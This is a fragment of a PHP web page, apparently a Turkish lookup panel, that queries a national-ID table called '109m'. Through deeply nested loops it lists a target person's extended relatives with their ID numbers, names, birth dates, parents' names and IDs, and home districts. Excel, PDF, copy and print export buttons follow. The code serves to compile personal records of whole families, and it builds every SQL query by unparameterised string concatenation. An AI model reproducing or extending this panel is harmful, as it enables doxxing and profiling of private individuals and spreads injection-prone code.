																		<td>" . $row["MEMLEKETIL"] . "</td>
																		<td>" . $row["MEMLEKETILCE"] . "</td>
													
																	</tr>";
                                                                                $sqlbabaannekardesbabaannekardescocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                                $resultbabaannekardesbabaannekardescocugu = $baglanti->query($sqlbabaannekardesbabaannekardescocugu);
                                                                                while ($row = $resultbabaannekardesbabaannekardescocugu->fetch_assoc()) {
                                                                                    echo "<tr>
																			<td> Babasının Annesinin Kardeşinin Torunu </td>
																			<td>" . $row["TC"] . "</td>
																			<td>" . $row["AD"] . "</td>
																			<td>" . $row["SOYAD"] . "</td>
																			<td>" . $row["DOGUMTARIHI"] . "</td>
																			<td>" . $row["ANNEADI"] . "</td>
																			<td>" . $row["ANNETC"] . "</td>
																			<td>" . $row["BABAADI"] . "</td>
																			<td>" . $row["BABATC"] . "</td>
																			<td>" . $row["MEMLEKETIL"] . "</td>
																			<td>" . $row["MEMLEKETILCE"] . "</td>
														
																		</tr>";
                                                                                    $sqlbabaannekardesbabaannekardesbabaannekardescocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                                    $resultbabaannekardesbabaannekardesbabaannekardescocugu = $baglanti->query($sqlbabaannekardesbabaannekardesbabaannekardescocugu);
                                                                                    while ($row = $resultbabaannekardesbabaannekardesbabaannekardescocugu->fetch_assoc()) {
                                                                                        echo "<tr>
																				<td> Babasının Annesinin Kardeşinin TorunuNUN Çocuğu </td>
																				<td>" . $row["TC"] . "</td>
																				<td>" . $row["AD"] . "</td>
																				<td>" . $row["SOYAD"] . "</td>
																				<td>" . $row["DOGUMTARIHI"] . "</td>
																				<td>" . $row["ANNEADI"] . "</td>
																				<td>" . $row["ANNETC"] . "</td>
																				<td>" . $row["BABAADI"] . "</td>
																				<td>" . $row["BABATC"] . "</td>
																				<td>" . $row["MEMLEKETIL"] . "</td>
																				<td>" . $row["MEMLEKETILCE"] . "</td>
															
																			</tr>";
                                                                                    }
                                                                                }
                                                                            }
                                                                        }

                                                                        while ($row = $resultbabaBabası->fetch_assoc()) {
                                                                            echo "<tr>
																	<td> Babasının Annesinin Babası </td>
																	<td>" . $row["TC"] . "</td>
																	<td>" . $row["AD"] . "</td>
																	<td>" . $row["SOYAD"] . "</td>
																	<td>" . $row["DOGUMTARIHI"] . "</td>
																	<td>" . $row["ANNEADI"] . "</td>
																	<td>" . $row["ANNETC"] . "</td>
																	<td>" . $row["BABAADI"] . "</td>
																	<td>" . $row["BABATC"] . "</td>
																	<td>" . $row["MEMLEKETIL"] . "</td>
																	<td>" . $row["MEMLEKETILCE"] . "</td>
												
																</tr>";
                                                                        }
                                                                        while ($row = $resultbabaAnnesi->fetch_assoc()) {
                                                                            echo "<tr>
																	<td> Babasının Annesinin Annesi </td>
																	<td>" . $row["TC"] . "</td>
																	<td>" . $row["AD"] . "</td>
																	<td>" . $row["SOYAD"] . "</td>
																	<td>" . $row["DOGUMTARIHI"] . "</td>
																	<td>" . $row["ANNEADI"] . "</td>
																	<td>" . $row["ANNETC"] . "</td>
																	<td>" . $row["BABAADI"] . "</td>
																	<td>" . $row["BABATC"] . "</td>
																	<td>" . $row["MEMLEKETIL"] . "</td>
																	<td>" . $row["MEMLEKETILCE"] . "</td>
												
																</tr>";
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                                }

                                                                if ($selectedSide !== 'baba') {
                                                                    while ($row = $resultAnnesi->fetch_assoc()) {
                                                                echo "<tr>
														<td> Annesi </td>
														<td>" . $row["TC"] . "</td>
														<td>" . $row["AD"] . "</td>
														<td>" . $row["SOYAD"] . "</td>
														<td>" . $row["DOGUMTARIHI"] . "</td>
														<td>" . $row["ANNEADI"] . "</td>
														<td>" . $row["ANNETC"] . "</td>
														<td>" . $row["BABAADI"] . "</td>
														<td>" . $row["BABATC"] . "</td>
														<td>" . $row["MEMLEKETIL"] . "</td>
														<td>" . $row["MEMLEKETILCE"] . "</td>
									
													</tr>";
                                                                $sqlannekardesi = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["BABATC"] . "' OR `ANNETC` = '" . $row["ANNETC"] . "' ) ";
                                                                $resultannekardesi = $baglanti->query($sqlannekardesi);
                                                                $sqlanneBabası = "SELECT * FROM `109m` WHERE `TC` = '" . $row["BABATC"] . "' ";
                                                                $resultanneBabası = $baglanti->query($sqlanneBabası);
                                                                $sqlanneAnnesi = "SELECT * FROM `109m` WHERE `TC` = '" . $row["ANNETC"] . "' ";
                                                                $resultanneAnnesi = $baglanti->query($sqlanneAnnesi);

                                                                while ($row = $resultannekardesi->fetch_assoc()) {
                                                                    echo "<tr>
															<td> Annesinin Kardeşi </td>
															<td>" . $row["TC"] . "</td>
															<td>" . $row["AD"] . "</td>
															<td>" . $row["SOYAD"] . "</td>
															<td>" . $row["DOGUMTARIHI"] . "</td>
															<td>" . $row["ANNEADI"] . "</td>
															<td>" . $row["ANNETC"] . "</td>
															<td>" . $row["BABAADI"] . "</td>
															<td>" . $row["BABATC"] . "</td>
															<td>" . $row["MEMLEKETIL"] . "</td>
															<td>" . $row["MEMLEKETILCE"] . "</td>
										
														</tr>";
                                                                    $sqlannekardescocugu = "SELECT * FROM `109m` WHERE `BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ";
                                                                    $resultannekardescocugu = $baglanti->query($sqlannekardescocugu);
                                                                    while ($row = $resultannekardescocugu->fetch_assoc()) {
                                                                        echo "<tr>
																<td> Annesinin Kardeşinin Çocuğu </td>
																<td>" . $row["TC"] . "</td>
																<td>" . $row["AD"] . "</td>
																<td>" . $row["SOYAD"] . "</td>
																<td>" . $row["DOGUMTARIHI"] . "</td>
																<td>" . $row["ANNEADI"] . "</td>
																<td>" . $row["ANNETC"] . "</td>
																<td>" . $row["BABAADI"] . "</td>
																<td>" . $row["BABATC"] . "</td>
																<td>" . $row["MEMLEKETIL"] . "</td>
																<td>" . $row["MEMLEKETILCE"] . "</td>
											
															</tr>";
                                                                        $sqlannekardesannekardescocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                        $resultannekardesannekardescocugu = $baglanti->query($sqlannekardesannekardescocugu);
                                                                        while ($row = $resultannekardesannekardescocugu->fetch_assoc()) {
                                                                            echo "<tr>
																	<td> Annesinin Kardeşinin Torunu </td>
																	<td>" . $row["TC"] . "</td>
																	<td>" . $row["AD"] . "</td>
																	<td>" . $row["SOYAD"] . "</td>
																	<td>" . $row["DOGUMTARIHI"] . "</td>
																	<td>" . $row["ANNEADI"] . "</td>
																	<td>" . $row["ANNETC"] . "</td>
																	<td>" . $row["BABAADI"] . "</td>
																	<td>" . $row["BABATC"] . "</td>
																	<td>" . $row["MEMLEKETIL"] . "</td>
																	<td>" . $row["MEMLEKETILCE"] . "</td>
												
																</tr>";
                                                                            $sqlannekardesannekardesannekardescocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                            $resultannekardesannekardesannekardescocugu = $baglanti->query($sqlannekardesannekardesannekardescocugu);
                                                                            while ($row = $resultannekardesannekardesannekardescocugu->fetch_assoc()) {
                                                                                echo "<tr>
																		<td> Annesinin Kardeşinin Torununun Çocuğu </td>
																		<td>" . $row["TC"] . "</td>
																		<td>" . $row["AD"] . "</td>
																		<td>" . $row["SOYAD"] . "</td>
																		<td>" . $row["DOGUMTARIHI"] . "</td>
																		<td>" . $row["ANNEADI"] . "</td>
																		<td>" . $row["ANNETC"] . "</td>
																		<td>" . $row["BABAADI"] . "</td>
																		<td>" . $row["BABATC"] . "</td>
																		<td>" . $row["MEMLEKETIL"] . "</td>
																		<td>" . $row["MEMLEKETILCE"] . "</td>
													
																	</tr>";
                                                                            }
                                                                        }
                                                                    }
                                                                }

                                                                while ($row = $resultanneBabası->fetch_assoc()) {
                                                                    echo "<tr>
															<td> Annesinin Babası </td>
															<td>" . $row["TC"] . "</td>
															<td>" . $row["AD"] . "</td>
															<td>" . $row["SOYAD"] . "</td>
															<td>" . $row["DOGUMTARIHI"] . "</td>
															<td>" . $row["ANNEADI"] . "</td>
															<td>" . $row["ANNETC"] . "</td>
															<td>" . $row["BABAADI"] . "</td>
															<td>" . $row["BABATC"] . "</td>
															<td>" . $row["MEMLEKETIL"] . "</td>
															<td>" . $row["MEMLEKETILCE"] . "</td>
										
														</tr>";
                                                                    $sqlbabakardesi = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["BABATC"] . "' OR `ANNETC` = '" . $row["ANNETC"] . "' ) ";
                                                                    $resultbabakardesi = $baglanti->query($sqlbabakardesi);
                                                                    $sqlbabaBabası = "SELECT * FROM `109m` WHERE `TC` = '" . $row["BABATC"] . "' ";
                                                                    $resultbabaBabası = $baglanti->query($sqlbabaBabası);
                                                                    $sqlbabaAnnesi = "SELECT * FROM `109m` WHERE `TC` = '" . $row["ANNETC"] . "' ";
                                                                    $resultbabaAnnesi = $baglanti->query($sqlbabaAnnesi);

                                                                    while ($row = $resultbabakardesi->fetch_assoc()) {
                                                                        echo "<tr>
																<td> Annesinin Babasının Kardeşi </td>
																<td>" . $row["TC"] . "</td>
																<td>" . $row["AD"] . "</td>
																<td>" . $row["SOYAD"] . "</td>
																<td>" . $row["DOGUMTARIHI"] . "</td>
																<td>" . $row["ANNEADI"] . "</td>
																<td>" . $row["ANNETC"] . "</td>
																<td>" . $row["BABAADI"] . "</td>
																<td>" . $row["BABATC"] . "</td>
																<td>" . $row["MEMLEKETIL"] . "</td>
																<td>" . $row["MEMLEKETILCE"] . "</td>
											
															</tr>";
                                                                        $sqlannebabakardescocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                        $resultannebabakardescocugu = $baglanti->query($sqlannebabakardescocugu);
                                                                        while ($row = $resultannebabakardescocugu->fetch_assoc()) {
                                                                            echo "<tr>
																	<td> Annesinin Babasının Kardeşinin Çocuğu </td>
																	<td>" . $row["TC"] . "</td>
																	<td>" . $row["AD"] . "</td>
																	<td>" . $row["SOYAD"] . "</td>
																	<td>" . $row["DOGUMTARIHI"] . "</td>
																	<td>" . $row["ANNEADI"] . "</td>
																	<td>" . $row["ANNETC"] . "</td>
																	<td>" . $row["BABAADI"] . "</td>
																	<td>" . $row["BABATC"] . "</td>
																	<td>" . $row["MEMLEKETIL"] . "</td>
																	<td>" . $row["MEMLEKETILCE"] . "</td>
												
																</tr>";
                                                                            $sqlannebabakardesannebabakardescocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                            $resultannebabakardesannebabakardescocugu = $baglanti->query($sqlannebabakardesannebabakardescocugu);
                                                                            while ($row = $resultannebabakardesannebabakardescocugu->fetch_assoc()) {
                                                                                echo "<tr>
																		<td> Annesinin Babasının Kardeşinin Torunu </td>
																		<td>" . $row["TC"] . "</td>
																		<td>" . $row["AD"] . "</td>
																		<td>" . $row["SOYAD"] . "</td>
																		<td>" . $row["DOGUMTARIHI"] . "</td>
																		<td>" . $row["ANNEADI"] . "</td>
																		<td>" . $row["ANNETC"] . "</td>
																		<td>" . $row["BABAADI"] . "</td>
																		<td>" . $row["BABATC"] . "</td>
																		<td>" . $row["MEMLEKETIL"] . "</td>
																		<td>" . $row["MEMLEKETILCE"] . "</td>
													
																	</tr>";
                                                                                $sqlannebabakardesannebabakardesannebabakardescocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                                $resultannebabakardesannebabakardesannebabakardescocugu = $baglanti->query($sqlannebabakardesannebabakardesannebabakardescocugu);
                                                                                while ($row = $resultannebabakardesannebabakardesannebabakardescocugu->fetch_assoc()) {
                                                                                    echo "<tr>
																			<td> Annesinin Babasının Kardeşinin Torununun Çocuğu </td>
																			<td>" . $row["TC"] . "</td>
																			<td>" . $row["AD"] . "</td>
																			<td>" . $row["SOYAD"] . "</td>
																			<td>" . $row["DOGUMTARIHI"] . "</td>
																			<td>" . $row["ANNEADI"] . "</td>
																			<td>" . $row["ANNETC"] . "</td>
																			<td>" . $row["BABAADI"] . "</td>
																			<td>" . $row["BABATC"] . "</td>
																			<td>" . $row["MEMLEKETIL"] . "</td>
																			<td>" . $row["MEMLEKETILCE"] . "</td>
														
																		</tr>";
                                                                                }
                                                                            }
                                                                        }
                                                                    }

                                                                    while ($row = $resultbabaBabası->fetch_assoc()) {
                                                                        echo "<tr>
																<td> Annesinin Babasının Babası </td>
																<td>" . $row["TC"] . "</td>
																<td>" . $row["AD"] . "</td>
																<td>" . $row["SOYAD"] . "</td>
																<td>" . $row["DOGUMTARIHI"] . "</td>
																<td>" . $row["ANNEADI"] . "</td>
																<td>" . $row["ANNETC"] . "</td>
																<td>" . $row["BABAADI"] . "</td>
																<td>" . $row["BABATC"] . "</td>
																<td>" . $row["MEMLEKETIL"] . "</td>
																<td>" . $row["MEMLEKETILCE"] . "</td>
											
															</tr>";
                                                                    }
                                                                    while ($row = $resultbabaAnnesi->fetch_assoc()) {
                                                                        echo "<tr>
																<td> Annesinin Babasının Annesi </td>
																<td>" . $row["TC"] . "</td>
																<td>" . $row["AD"] . "</td>
																<td>" . $row["SOYAD"] . "</td>
																<td>" . $row["DOGUMTARIHI"] . "</td>
																<td>" . $row["ANNEADI"] . "</td>
																<td>" . $row["ANNETC"] . "</td>
																<td>" . $row["BABAADI"] . "</td>
																<td>" . $row["BABATC"] . "</td>
																<td>" . $row["MEMLEKETIL"] . "</td>
																<td>" . $row["MEMLEKETILCE"] . "</td>
											
															</tr>";
                                                                    }
                                                                }
                                                                while ($row = $resultanneAnnesi->fetch_assoc()) {
                                                                    echo "<tr>
															<td> Annesinin Annesi </td>
															<td>" . $row["TC"] . "</td>
															<td>" . $row["AD"] . "</td>
															<td>" . $row["SOYAD"] . "</td>
															<td>" . $row["DOGUMTARIHI"] . "</td>
															<td>" . $row["ANNEADI"] . "</td>
															<td>" . $row["ANNETC"] . "</td>
															<td>" . $row["BABAADI"] . "</td>
															<td>" . $row["BABATC"] . "</td>
															<td>" . $row["MEMLEKETIL"] . "</td>
															<td>" . $row["MEMLEKETILCE"] . "</td>
										
														</tr>";
                                                                    $sqlannekardesi = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["BABATC"] . "' OR `ANNETC` = '" . $row["ANNETC"] . "' ) ";
                                                                    $resultannekardesi = $baglanti->query($sqlannekardesi);
                                                                    $sqlanneBabası = "SELECT * FROM `109m` WHERE `TC` = '" . $row["BABATC"] . "' ";
                                                                    $resultanneBabası = $baglanti->query($sqlanneBabası);
                                                                    $sqlanneAnnesi = "SELECT * FROM `109m` WHERE `TC` = '" . $row["ANNETC"] . "' ";
                                                                    $resultanneAnnesi = $baglanti->query($sqlanneAnnesi);

                                                                    while ($row = $resultannekardesi->fetch_assoc()) {
                                                                        echo "<tr>
																<td> Annesinin Annesinin Kardeşi </td>
																<td>" . $row["TC"] . "</td>
																<td>" . $row["AD"] . "</td>
																<td>" . $row["SOYAD"] . "</td>
																<td>" . $row["DOGUMTARIHI"] . "</td>
																<td>" . $row["ANNEADI"] . "</td>
																<td>" . $row["ANNETC"] . "</td>
																<td>" . $row["BABAADI"] . "</td>
																<td>" . $row["BABATC"] . "</td>
																<td>" . $row["MEMLEKETIL"] . "</td>
																<td>" . $row["MEMLEKETILCE"] . "</td>
											
															</tr>";
                                                                        $sqlanneannekardescocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                        $resultanneannekardescocugu = $baglanti->query($sqlanneannekardescocugu);
                                                                        while ($row = $resultanneannekardescocugu->fetch_assoc()) {
                                                                            echo "<tr>
																	<td> Annesinin Annesinin Kardeşinin Çocuğu </td>
																	<td>" . $row["TC"] . "</td>
																	<td>" . $row["AD"] . "</td>
																	<td>" . $row["SOYAD"] . "</td>
																	<td>" . $row["DOGUMTARIHI"] . "</td>
																	<td>" . $row["ANNEADI"] . "</td>
																	<td>" . $row["ANNETC"] . "</td>
																	<td>" . $row["BABAADI"] . "</td>
																	<td>" . $row["BABATC"] . "</td>
																	<td>" . $row["MEMLEKETIL"] . "</td>
																	<td>" . $row["MEMLEKETILCE"] . "</td>
												
																</tr>";
                                                                            $sqlanneannekardesanneannekardescocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                            $resultanneannekardesanneannekardescocugu = $baglanti->query($sqlanneannekardesanneannekardescocugu);
                                                                            while ($row = $resultanneannekardesanneannekardescocugu->fetch_assoc()) {
                                                                                echo "<tr>
																		<td> Annesinin Annesinin Kardeşinin Torunu </td>
																		<td>" . $row["TC"] . "</td>
																		<td>" . $row["AD"] . "</td>
																		<td>" . $row["SOYAD"] . "</td>
																		<td>" . $row["DOGUMTARIHI"] . "</td>
																		<td>" . $row["ANNEADI"] . "</td>
																		<td>" . $row["ANNETC"] . "</td>
																		<td>" . $row["BABAADI"] . "</td>
																		<td>" . $row["BABATC"] . "</td>
																		<td>" . $row["MEMLEKETIL"] . "</td>
																		<td>" . $row["MEMLEKETILCE"] . "</td>
													
																	</tr>";
                                                                                $sqlanneannekardesanneannekardesanneannekardescocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                                $resultanneannekardesanneannekardesanneannekardescocugu = $baglanti->query($sqlanneannekardesanneannekardesanneannekardescocugu);
                                                                                while ($row = $resultanneannekardesanneannekardesanneannekardescocugu->fetch_assoc()) {
                                                                                    echo "<tr>
																			<td> Annesinin Annesinin Kardeşinin Torununun Çocuğu </td>
																			<td>" . $row["TC"] . "</td>
																			<td>" . $row["AD"] . "</td>
																			<td>" . $row["SOYAD"] . "</td>
																			<td>" . $row["DOGUMTARIHI"] . "</td>
																			<td>" . $row["ANNEADI"] . "</td>
																			<td>" . $row["ANNETC"] . "</td>
																			<td>" . $row["BABAADI"] . "</td>
																			<td>" . $row["BABATC"] . "</td>
																			<td>" . $row["MEMLEKETIL"] . "</td>
																			<td>" . $row["MEMLEKETILCE"] . "</td>
														
																		</tr>";
                                                                                    $sqlanneannekardesanneannekardesanneannekardesanneannekardescocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                                    $resultanneannekardesanneannekardesanneannekardesanneannekardescocugu = $baglanti->query($sqlanneannekardesanneannekardesanneannekardesanneannekardescocugu);
                                                                                    while ($row = $resultanneannekardesanneannekardesanneannekardesanneannekardescocugu->fetch_assoc()) {
                                                                                        echo "<tr>
																				<td> Annesinin Annesinin Kardeşinin Torununun Torunu </td>
																				<td>" . $row["TC"] . "</td>
																				<td>" . $row["AD"] . "</td>
																				<td>" . $row["SOYAD"] . "</td>
																				<td>" . $row["DOGUMTARIHI"] . "</td>
																				<td>" . $row["ANNEADI"] . "</td>
																				<td>" . $row["ANNETC"] . "</td>
																				<td>" . $row["BABAADI"] . "</td>
																				<td>" . $row["BABATC"] . "</td>
																				<td>" . $row["MEMLEKETIL"] . "</td>
																				<td>" . $row["MEMLEKETILCE"] . "</td>
															
																			</tr>";
                                                                                    }
                                                                                }
                                                                            }
                                                                        }

                                                                        while ($row = $resultanneBabası->fetch_assoc()) {
                                                                            echo "<tr>
																<td> Annesinin Annesinin Babası </td>
																<td>" . $row["TC"] . "</td>
																<td>" . $row["AD"] . "</td>
																<td>" . $row["SOYAD"] . "</td>
																<td>" . $row["DOGUMTARIHI"] . "</td>
																<td>" . $row["ANNEADI"] . "</td>
																<td>" . $row["ANNETC"] . "</td>
																<td>" . $row["BABAADI"] . "</td>
																<td>" . $row["BABATC"] . "</td>
																<td>" . $row["MEMLEKETIL"] . "</td>
																<td>" . $row["MEMLEKETILCE"] . "</td>
											
															</tr>";
                                                                        }
                                                                        while ($row = $resultanneAnnesi->fetch_assoc()) {
                                                                            echo "<tr>
																<td> Annesinin Annesinin Annesi </td>
																<td>" . $row["TC"] . "</td>
																<td>" . $row["AD"] . "</td>
																<td>" . $row["SOYAD"] . "</td>
																<td>" . $row["DOGUMTARIHI"] . "</td>
																<td>" . $row["ANNEADI"] . "</td>
																<td>" . $row["ANNETC"] . "</td>
																<td>" . $row["BABAADI"] . "</td>
																<td>" . $row["BABATC"] . "</td>
																<td>" . $row["MEMLEKETIL"] . "</td>
																<td>" . $row["MEMLEKETILCE"] . "</td>
											
															</tr>";
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                                    ?>
                                                    </tbody>
                                                </table>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php include 'inc/footer_main.php'; ?>
    </div>
</div>
</div>
<style>
    #kt_datatable_dom_positioning_filter {
        text-align: left;
        margin-right: 15px;
    }

code
Code
download
content_copy
expand_less
.dt-buttons button:nth-child(3) {
    background-color: #dc3545 !important;
    color: #fff;
    border-color: #dc3545;
}
</style>

<script>
    $(document).ready(function() {
        var table = $('#kt_datatable_dom_positioning').DataTable({
            "language": {
                "lengthMenu": "Sayfada _MENU_ kayıt göster",
                "emptyTable": "Tabloda herhangi bir veri bulunmamaktadır",
                "info": "_TOTAL_ kayıttan _START_ - _END_ arasındaki kayıtlar gösteriliyor",
                "infoEmpty": "Gösterilecek kayıt bulunamadı",
                "infoFiltered": "(_MAX_ kayıt içerisinden bulunan)",
                "zeroRecords": "Eşleşen kayıt bulunamadı",
                "search": "Ara:",
                "processing": "İşleniyor...",
                "loadingRecords": "Kayıtlar yükleniyor...",
                "paginate": {
                    "first": "İlk",
                    "last": "Son",
                    "next": "Sonraki",
                    "previous": "Önceki"
                },
                "buttons": {
                    "copy": "Kopyala",
                    "excel": "Excel",
                    "pdf": "PDF"
                }
            },
            "dom": "<'row'" +
                "<'col-sm-12 d-flex align-items-center justify-content-start'l>" +
                "<'col-sm-12 d-flex align-items-center justify-content-end'f>" +
                ">" +
                "<'table-responsive'tr>" +
                "<'row'" +
                "<'col-sm-12 col-md-5 d-flex align-items-center justify-content-start justify-content-md-start'i>" +
                "<'col-sm-12 col-md-7 d-flex align-items-center justify-content-start justify-content-md-end'p>" +
                ">",
            "sDom": '<"refresh"i<"clear">>rt<"top"lf<"clear">>rt<"bottom"p<"clear">>',
            "paging": false,
            "ordering": false,
            "info": false
        });

        new $.fn.dataTable.Buttons(table, {
            buttons: [
                'excel',
                {
                    extend: 'pdfHtml5',
                    customize: function (doc) {
                        // Özel PDF ayarları buraya eklenir
                        doc.defaultStyle.fontSize = 5;
                        doc.styles.tableHeader.fontSize = 5;
                        doc.styles.tableBodyOdd.fontSize = 5;
                        doc.styles.tableBodyEven.fontSize = 5;
                    }
                },
                {
                    text: 'Sorun Bildir',
                    action: function (e, dt, node, config) {
                        // SweetAlert ile kullanıcıya bir form göster
                        Swal.fire({
                            title: 'Sorun Bildir',
                            html: '<textarea max="200" min="10" id="sorun" class="form-control" placeholder="Sorununuzu yazın">',
                            focusConfirm: false,
                            preConfirm: () => {
                                // Kullanıcının girdiği değeri al
                                const sorun = Swal.getPopup().querySelector('#sorun').value;
                                // Discord webhook'a post at
                                postToDiscordWebhook(sorun);
                            }
                        });
                    }
                }
            ]
        }).container().appendTo($('#kt_datatable_dom_positioning_wrapper .col-sm-12:eq(1)'));

        $('#kt_datatable_dom_positioning_filter input').on('keyup', function() {
            table.search(this.value).draw();
        });
    });


</script>

<script id="clearTable">
    function clearTable() {
        window.location.reload();
    }
</script>

<script id="copyTable">
    function copyTable() {
        var copiedText = "";

        // Tabloyu seçin
        var table = document.getElementById('kt_datatable_dom_positioning'); // your_table_id, HTML tablonuzun ID'siyle değiştirilmelidir

        // Tablonun satırlarını döngüye alın
        for (var i = 0; i < table.rows.length; i++) {
            var row = table.rows[i];
            // Her satırın hücrelerini döngüye alın
            for (var j = 0; j < row.cells.length; j++) {
                copiedText += row.cells[j].textContent + "\t"; // Hücreler arasına bir sekme ekleyebilirsiniz
            }
            // Her satırın sonunda yeni bir satır ekleyin
            copiedText += "\n";
        }

        // Kopyalanan metni panoya kopyalayın
        var textarea = document.createElement("textarea");
        textarea.value = copiedText;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand("copy");
        document.body.removeChild(textarea);

        toastr.success('Tablo içeriği panoya kopyalandı.');
    }
</script>

<script id="printTable">
    function printTable() {
        var table = document.getElementById("kt_datatable_dom_positioning");
        var windowContent = '<table border="1">';
        for (var i = 0; i < table.rows.length; i++) {
            windowContent += "<tr>";
            for (var j = 0; j < table.rows[i].cells.length; j++) {
                windowContent += "<td>" + table.rows[i].cells[j].innerHTML + "</td>";
            }
            windowContent += "</tr>";
        }
        windowContent += "</table>";

        var printWin = window.open('', '', 'width=600,height=600');
        printWin.document.open();
        printWin.document.write('<html><head><title>Tablo Yazdırma</title></head><body onload="window.print()">' + windowContent + '</body></html>');
        printWin.document.close();
        printWin.focus();
    }
</script>

<div id="kt_scrolltop" class="scrolltop" data-kt-scrolltop="true">
    <i class="ki-duotone ki-arrow-up"><span class="path1"></span><span class="path2"></span></i>
</div>

<script src="assets/plugins/global/plugins.bundle.js"></script>

<script src="assets/js/scripts.bundle.js"></script>

<script src="assets/plugins/custom/fullcalendar/fullcalendar.bundle.js"></script>

<script src="assets/plugins/custom/datatables/datatables.bundle.js"></script>

<script src="assets/js/widgets.bundle.js"></script>

<script src="assets/js/custom/widgets.js"></script>

<script src="assets/js/custom/apps/chat/chat.js"></script>

<script src="assets/js/custom/utilities/modals/users-search.js"></script>

</body>

</html> 
